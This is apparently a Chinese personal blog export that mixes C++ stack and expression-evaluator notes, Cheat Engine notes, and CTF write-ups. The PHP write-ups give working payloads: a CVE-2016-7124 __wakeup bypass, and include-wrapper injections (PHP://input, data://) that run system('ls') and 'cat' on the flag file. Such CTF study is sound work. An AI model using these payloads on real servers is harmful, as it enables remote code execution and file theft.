<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) </span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	stk.<span class="built_in">empty</span>();  <span class="comment">//判断栈是否为空,如果为空则输出true,否则输出false</span></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) &#123;</span><br><span class="line">		cout&lt;&lt;<span class="string">&quot;此时栈顶的值为&quot;</span>&lt;&lt;stk.<span class="built_in">top</span>()&lt;&lt;endl;</span><br><span class="line">		stk.<span class="built_in">pop</span>(); <span class="comment">//弹出元素</span></span><br><span class="line">		cout&lt;&lt;boolalpha&lt;&lt;<span class="string">&quot;栈空?:&quot;</span>&lt;&lt;stk.<span class="built_in">empty</span>()&lt;&lt;endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">/* 输出结果:</span></span><br><span class="line"><span class="comment">此时栈顶的值为3</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为2</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为1</span></span><br><span class="line"><span class="comment">栈空?:false</span></span><br><span class="line"><span class="comment">此时栈顶的值为0</span></span><br><span class="line"><span class="comment">栈空?:true</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>size() 统计栈中的元素</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	stack&lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">4</span>;i++) </span><br><span class="line">		stk.<span class="built_in">push</span>(i);</span><br><span class="line">	<span class="comment">// 0 1 2 3</span></span><br><span class="line">	<span class="keyword">long</span> <span class="keyword">long</span>  n=stk.<span class="built_in">size</span>(); <span class="comment">//注意返回值为long long 类型</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,n);</span><br><span class="line">    <span class="comment">//输出:4  //此时栈中共有4个元素</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="简单算数表达式的求值"><a href="#简单算数表达式的求值" class="headerlink" title="简单算数表达式的求值"></a>简单算数表达式的求值</h3><p>​    两个栈的原理: 符号栈和 数值栈</p>
<p>​    大致意思: 检索到数字的时候,扔到数值栈,检索到符号的时候,比较符号的优先级(map函数的用法);</p>
<blockquote>
<p>  Map是STL 的一个关联容器，它提供一对一（其中第一个可以称为关键字，每个关键字只能在map中出现一次，第二个可能称为该关键字的值）的数据处理能力，由于这个特性，它完成有可能在我们处理一对一数据的时候，在编程上提供快速通道。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//map容器定义方法:</span></span><br><span class="line">map&lt;<span class="keyword">int</span>,string&gt; m; <span class="comment">//定义一个键值为int 实值为string的关联容器</span></span><br><span class="line"><span class="comment">//map容器赋值方法:</span></span><br><span class="line">m[<span class="number">1000</span>]=<span class="string">&quot;测试&quot;</span>;<span class="comment">//赋值</span></span><br><span class="line">cout&lt;&lt;m[<span class="number">1000</span>]&lt;&lt;endl;<span class="comment">//打印/输出</span></span><br><span class="line"><span class="comment">//***输出结果***</span></span><br><span class="line"><span class="comment">//&amp; 测试</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>大致思路:</p>
<p>​    输入一串表达式:</p>
<p>​    <strong>遇到数字时:</strong> 数字入<strong>操作数栈</strong></p>
<p>​    <strong>遇到操作字符ch时:</strong> 当字符ch的栈外优先级大于<strong>操作符栈</strong>栈顶元素θ的栈内优先级的时候, 这个字符ch入栈. 否则(即要处理字符ch的栈内优先级小于或者等于<strong>操作符栈</strong>栈顶元素θ的栈内优先级时)将<strong>操作数栈</strong>弹出两个元素,与<strong>操作符栈</strong>栈顶元素θ的符号,进行加减乘除的操作,即num.top(1) θ num.top(2),得出的结构入<strong>操作符栈</strong>(push(num.top(1) θ num.top(2)))并将θ弹出,加入要处理字符ch;</p>
<p>当遇到’)’时: 处理括号内的表达式:”(ABC)”的结果并加入到<strong>操作数栈</strong>(方法如同字符遇到’#’的操作)</p>
<p><strong>当没有要处理的数字或者符号时,输入#为结束标志:</strong>此时,循环操作: 从操作数栈中弹出两个数字,从<strong>操作符栈</strong>中弹出一个符号,进行四则运算;—-&gt;<strong>直到栈空</strong>(即操作符栈遇到’#’/当进行括号匹配时则遇到’(‘);</p>
<p>最后操作数栈 栈顶即为表达式四则运算的结果</p>
<p>附上代码:(待优化)</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//c++</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> endl <span class="meta-string">&quot;\n&quot;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; icp; <span class="comment">//栈外优先级</span></span><br><span class="line">map&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; isp; <span class="comment">//站内优先级</span></span><br><span class="line">stack&lt;<span class="keyword">char</span> &gt; OPTR; <span class="comment">//操作符栈</span></span><br><span class="line">stack&lt;<span class="keyword">int</span> &gt; OPNR; <span class="comment">//操作数栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ispandicp</span><span class="params">()</span></span>&#123;	</span><br><span class="line">    icp[<span class="string">&#x27;#&#x27;</span>]=<span class="number">0</span>;icp[<span class="string">&#x27;(&#x27;</span>]=<span class="number">6</span>;</span><br><span class="line">	icp[<span class="string">&#x27;*&#x27;</span>]=<span class="number">4</span>;icp[<span class="string">&#x27;/&#x27;</span>]=<span class="number">4</span>;</span><br><span class="line">	icp[<span class="string">&#x27;%&#x27;</span>]=<span class="number">4</span>;icp[<span class="string">&#x27;+&#x27;</span>]=<span class="number">2</span>;</span><br><span class="line">	icp[<span class="string">&#x27;-&#x27;</span>]=<span class="number">2</span>;icp[<span class="string">&#x27;)&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="comment">//////////</span></span><br><span class="line">	isp[<span class="string">&#x27;#&#x27;</span>]=<span class="number">0</span>;isp[<span class="string">&#x27;(&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	isp[<span class="string">&#x27;*&#x27;</span>]=<span class="number">5</span>;isp[<span class="string">&#x27;/&#x27;</span>]=<span class="number">5</span>;</span><br><span class="line">	isp[<span class="string">&#x27;%&#x27;</span>]=<span class="number">5</span>;isp[<span class="string">&#x27;+&#x27;</span>]=<span class="number">3</span>;</span><br><span class="line">	isp[<span class="string">&#x27;-&#x27;</span>]=<span class="number">3</span>;isp[<span class="string">&#x27;)&#x27;</span>]=<span class="number">6</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">count</span><span class="params">(<span class="keyword">char</span> optr)</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(OPTR.<span class="built_in">top</span>()!= optr) &#123;</span><br><span class="line">		<span class="keyword">int</span> a=OPNR.<span class="built_in">top</span>();</span><br><span class="line">		OPNR.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="keyword">int</span> b=OPNR.<span class="built_in">top</span>();</span><br><span class="line">		OPNR.<span class="built_in">pop</span>();</span><br><span class="line">		<span class="keyword">char</span> c=OPTR.<span class="built_in">top</span>();</span><br><span class="line">		<span class="keyword">if</span>(c==<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(a+b);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(b-a);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(a*b);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(c ==<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(b/a);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">			OPNR.<span class="built_in">push</span>(b%a);</span><br><span class="line">		OPTR.<span class="built_in">pop</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	OPTR.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">ispandicp</span>();</span><br><span class="line">	<span class="comment">//cout&lt;&lt;isp[&#x27;)&#x27;]&lt;&lt;endl;</span></span><br><span class="line">	cout&lt;&lt;<span class="string">&quot;请输入一串表达式,以#号结束&quot;</span>&lt;&lt;endl;</span><br><span class="line">	OPTR.<span class="built_in">push</span>(<span class="string">&#x27;#&#x27;</span>); </span><br><span class="line">	<span class="keyword">char</span> ch[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">gets</span>(ch);</span><br><span class="line">	<span class="keyword">int</span> len=<span class="built_in">strlen</span>(ch)<span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span>(ch[len]!=<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请加入#&quot;</span>);</span><br><span class="line">		<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">if</span>((ch[len+<span class="number">1</span>]=<span class="built_in">getchar</span>() )!=<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;请加入#\n&quot;</span>);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(ch[i]!=<span class="string">&#x27;#&#x27;</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(ch[i]==<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">if</span>(ch[i]==<span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">			<span class="built_in">count</span>(<span class="string">&#x27;(&#x27;</span>);</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch[i]==<span class="string">&#x27;*&#x27;</span> || ch[i]==<span class="string">&#x27;(&#x27;</span> || ch[i]==<span class="string">&#x27;/&#x27;</span> || ch[i]==<span class="string">&#x27;%&#x27;</span> ||ch[i]==<span class="string">&#x27;+&#x27;</span>||ch[i] ==<span class="string">&#x27;-&#x27;</span>) &#123;</span><br><span class="line">			<span class="comment">//printf(&quot;icp[ch]:%d isp[OPTR.top()]:%d\n&quot;,icp[ch],isp[OPTR.top()]);</span></span><br><span class="line">			<span class="keyword">if</span>(icp[ch[i]]&gt;isp[OPTR.<span class="built_in">top</span>()])&#123;</span><br><span class="line">				OPTR.<span class="built_in">push</span>(ch[i]);</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">int</span> a=OPNR.<span class="built_in">top</span>();</span><br><span class="line">				OPNR.<span class="built_in">pop</span>();</span><br><span class="line">				<span class="keyword">int</span> b=OPNR.<span class="built_in">top</span>();</span><br><span class="line">				OPNR.<span class="built_in">pop</span>();</span><br><span class="line">				<span class="keyword">char</span> c=OPTR.<span class="built_in">top</span>();</span><br><span class="line">				<span class="keyword">if</span>(c==<span class="string">&#x27;+&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(a+b);</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(b-a);</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;*&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(a*b);</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(c ==<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(b/a);</span><br><span class="line">				<span class="keyword">else</span> <span class="keyword">if</span>(c==<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">					OPNR.<span class="built_in">push</span>(b%a);</span><br><span class="line">				<span class="comment">//printf(&quot;opnr: %d optr: %c &quot;,OPNR.top(),OPTR.top());	</span></span><br><span class="line">				OPTR.<span class="built_in">pop</span>();</span><br><span class="line">				<span class="comment">//printf(&quot;oprt: %c push: %c\n&quot;,OPTR.top(),c);</span></span><br><span class="line">				OPTR.<span class="built_in">push</span>(ch[i]);</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch[i]==<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(ch[i]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; ch[i]&lt;=<span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">			<span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">			<span class="keyword">while</span>(ch[i]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; ch[i]&lt;=<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">				num=num*<span class="number">10</span>+ch[i++]-<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">			OPNR.<span class="built_in">push</span>(num);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			cout&lt;&lt;<span class="string">&quot;&#x27;&quot;</span>&lt;&lt;ch[i]&lt;&lt;<span class="string">&quot;&#x27;&quot;</span>&lt;&lt;<span class="string">&quot;为非法字符,已过滤&quot;</span>&lt;&lt;endl;</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">count</span>(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">	cout&lt;&lt;OPNR.<span class="built_in">top</span>()&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="扩展任务1"><a href="#扩展任务1" class="headerlink" title="扩展任务1:"></a>扩展任务1:</h2><h3 id="较复杂的表达式求值和交互式求值"><a href="#较复杂的表达式求值和交互式求值" class="headerlink" title="较复杂的表达式求值和交互式求值:"></a>较复杂的表达式求值和交互式求值:</h3><p>​    难,需要模板实现:</p>
]]></content>
      <tags>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title>JS乱码问题</title>
    <url>/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<h3 id="JS乱码问题"><a href="#JS乱码问题" class="headerlink" title="JS乱码问题"></a>JS乱码问题</h3><p><img src="/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302143813041.png" alt="image-20220302143813041"></p>
<p>打开一个附件<br> <a href="..\..\..\FX\FanXIngX\646ecdf05af7490a85bb5c8ccb96c102(1">646ecdf05af7490a85bb5c8ccb96c102(1).zip</a>.zip) </p>
<p><img src="/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302143905163.png" alt="image-20220302143905163"></p>
<p>用TXT文档打开后发现乱码。<br>script 看得出是js脚本<br>添加后缀名：.html</p>
<p>用浏览器打开</p>
<hr>
<p>分析代码：</p>
<p><img src="/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302144157222.png" alt="image-20220302144157222"></p>
<p><strong>利用console.log( ) 在浏览器中调试代码 显现出正确代码（核心）</strong></p>
<p>将eval(_) 改为console.log(_) 然后 吧script指示删除。</p>
<p>打开浏览器控制台。</p>
<hr>
<p><img src="/2022/03/02/Study/NaNNaNNaNNaN-Batman%20JS%E4%B9%B1%E7%A0%81%E9%97%AE%E9%A2%98/image-20220302144543359.png" alt="image-20220302144543359"></p>
<p>看见正确的代码。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">$</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> e=<span class="built_in">document</span>.getElementById(<span class="string">&quot;c&quot;</span>).value;<span class="comment">//获取c中ID的值，也就是按钮的值</span></span><br><span class="line">    <span class="keyword">if</span>(e.length==<span class="number">16</span>) <span class="comment">//对e输入的字符串长度需要为16</span></span><br><span class="line">        <span class="keyword">if</span>(e.match(<span class="regexp">/^be0f23/</span>)!=<span class="literal">null</span>)<span class="comment">//打开正则表达式表格。匹配开头为be0f23</span></span><br><span class="line">            <span class="keyword">if</span>(e.match(<span class="regexp">/233ac/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配233ac</span></span><br><span class="line">                <span class="keyword">if</span>(e.match(<span class="regexp">/e98aa$/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配e98aa结束</span></span><br><span class="line">                    <span class="keyword">if</span>(e.match(<span class="regexp">/c7be9/</span>)!=<span class="literal">null</span>)<span class="comment">//匹配c7be9 如果输入的e满足这五个if，就能返回flag</span></span><br><span class="line">                                            <span class="comment">//根据首位确定凑出e的值 be0f233ac7be98aa</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="keyword">var</span> t=[<span class="string">&quot;fl&quot;</span>,<span class="string">&quot;s_a&quot;</span>,<span class="string">&quot;i&quot;</span>,<span class="string">&quot;e&#125;&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> n=[<span class="string">&quot;a&quot;</span>,<span class="string">&quot;_h0l&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> r=[<span class="string">&quot;g&#123;&quot;</span>,<span class="string">&quot;e&quot;</span>,<span class="string">&quot;_0&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> i=[<span class="string">&quot;it&#x27;&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;n&quot;</span>];</span><br><span class="line">                            <span class="keyword">var</span> s=[t,n,r,i];</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">var</span> o=<span class="number">0</span>;o&lt;<span class="number">13</span>;++o)</span><br><span class="line">                            &#123;</span><br><span class="line">                                <span class="built_in">document</span>.write(s[o%<span class="number">4</span>][<span class="number">0</span>]);</span><br><span class="line">                                s[o%<span class="number">4</span>].splice(<span class="number">0</span>,<span class="number">1</span>) <span class="comment">//返回flag</span></span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;input id=&quot;c&quot;&gt;&lt;buttononclick=$()&gt;Ok&lt;/button&gt;&#x27;</span>);<span class="keyword">delete</span> _</span><br></pre></td></tr></table></figure>
<p>稍微整理一下</p>
<p>分析代码即可获得答案.</p>
]]></content>
  </entry>
  <entry>
    <title>CE的工作原理 笔记</title>
    <url>/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</url>
    <content><![CDATA[<h2 id="第一部分：基础知识-计算机是如何运行游戏的"><a href="#第一部分：基础知识-计算机是如何运行游戏的" class="headerlink" title="第一部分：基础知识-计算机是如何运行游戏的"></a>第一部分：基础知识-计算机是如何运行游戏的</h2><p>总结:</p>
<p><img src="/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217155807949.png" alt="image-20220217155807949"></p>
<h2 id="第二部分：基础知识-CE的工作原理"><a href="#第二部分：基础知识-CE的工作原理" class="headerlink" title="第二部分：基础知识-CE的工作原理"></a>第二部分：基础知识-CE的工作原理</h2><p>CE监控游戏的内存，并对其进行任意的修改。<img src="/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160325859.png" alt="image-20220217160325859"></p>
<p><img src="/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217160630264.png" alt="image-20220217160630264"></p>
<p>修改的一般思路：去哪里 干什么</p>
<h2 id="第三部分：基础知识-二进制的表示"><a href="#第三部分：基础知识-二进制的表示" class="headerlink" title="第三部分：基础知识-二进制的表示"></a>第三部分：基础知识-二进制的表示</h2><p>十六进制数表示二进制数</p>
<p>0-F对应 1-15；</p>
<h2 id="第四部分数据：修改-基本操作"><a href="#第四部分数据：修改-基本操作" class="headerlink" title="第四部分数据：修改-基本操作"></a>第四部分数据：修改-基本操作</h2><p><img src="/2022/02/17/Study/CE%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/image-20220217161151056.png" alt="image-20220217161151056"></p>
<h2 id="第五部分"><a href="#第五部分" class="headerlink" title="第五部分"></a>第五部分</h2>]]></content>
  </entry>
  <entry>
    <title>unserialize3 wp</title>
    <url>/2022/01/16/Study/unserialize3/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$flag</span> = <span class="string">&#x27;111&#x27;</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&#x27;bad requests&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">?code=</span><br></pre></td></tr></table></figure>
<p>审计源码，看见__wakeup 以及题目unserialize3 猜想依旧是反序列化漏洞</p>
<p><strong>这里需要用到CVE-2016-7124漏洞</strong></p>
<blockquote>
<p>当序列化字符串中表示对象属性个数大于真实的属性个数或值类型不匹配时会跳过__wakeup的执行.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class xctf&#123;</span><br><span class="line">	public $flag = &#x27;111&#x27;;</span><br><span class="line">	public function __wakeup()&#123;</span><br><span class="line">	exit(&#x27;bad requests&#x27;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	$b=serialize(new xctf);</span><br><span class="line">	echo ($b);</span><br><span class="line">?&gt;</span><br><span class="line">输出结果:</span><br><span class="line">O:4:&quot;xctf&quot;:1:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">改为</span><br><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br><span class="line">浏览器输入</span><br><span class="line">http://111.200.241.244:64582/index.php?code=O:4:%22xctf%22:2:&#123;s:4:%22flag%22;s:3:%22111%22;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/16/Study/unserialize3/image-20220116235331921.png" alt="image-20220116235331921"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>XTCTF Web_php_include</title>
    <url>/2022/01/16/Study/Web_php_include/</url>
    <content><![CDATA[<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$_GET</span>[<span class="string">&#x27;hello&#x27;</span>];<span class="comment">//显示GET请求后hello的值</span></span><br><span class="line"><span class="variable">$page</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];<span class="comment">//对page进行GET请求，赋值给page</span></span><br><span class="line"><span class="keyword">while</span> (strstr(<span class="variable">$page</span>, <span class="string">&quot;php://&quot;</span>)) &#123;<span class="comment">//把page和php：// 比较，若page中第一次出现php://，则把php://替代为空</span></span><br><span class="line">    <span class="variable">$page</span>=str_replace(<span class="string">&quot;php://&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$page</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);<span class="comment">//包含page</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>打开网页 审计源码。</p>
<p>由题目Web_php_include可知，该题可能是php中include的漏洞</p>
<p>百度include漏洞，<a href="https://www.freebuf.com/articles/others-articles/256524.html">参考</a>  可知可以利用 php伪协议进行漏洞利用 <a href="https://www.cnblogs.com/weak-chicken/p/12275806.html">参考</a></p>
<p>解法1：</p>
<p>​    注意到strstr函数对大小写非常敏感<img src="/2022/01/16/Study/Web_php_include/image-20220116232319078.png" alt="image-20220116232319078" style="zoom:50%;"></p>
<p>我们则可以进行php://伪协议时，可以大写PHP，进行绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=PHP://input </span><br><span class="line">[POST请求] &lt;?php system(&quot;ls&quot;);?&gt;  #列出文件列表 后发现在fl4gisisish3r3.php中</span><br><span class="line">           &lt;?php system(&quot;cat fl4gisisish3r3.php&quot;);?&gt; #打开文件，发现flag</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/16/Study/Web_php_include/image-20220116233217504.png" alt="image-20220116233217504"></p>
<p>第二解法：</p>
<p>​    利用data://伪协议绕过php协议</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22ls%22);?%3E</span><br></pre></td></tr></table></figure>
<p><img src="/2022/01/16/Study/Web_php_include/image-20220116233423685.png" alt="image-20220116233423685"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://111.200.241.244:49491/?page=data://text//plain,%3C?php%20system(%22cat%20fl4gisisish3r3.php%22);?%3E（同第一种解法）</span><br><span class="line">可在源文件中找到flag</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Web_php_unserialize wp</title>
    <url>/2022/01/15/Study/Web_php_unserialize/</url>
    <content><![CDATA[<h3 id="攻防世界-Web-php-unserialize-wp"><a href="#攻防世界-Web-php-unserialize-wp" class="headerlink" title="攻防世界:Web_php_unserialize wp"></a>攻防世界:Web_php_unserialize wp</h3><p>由题可知道，该题为php反序列化漏洞。</p>
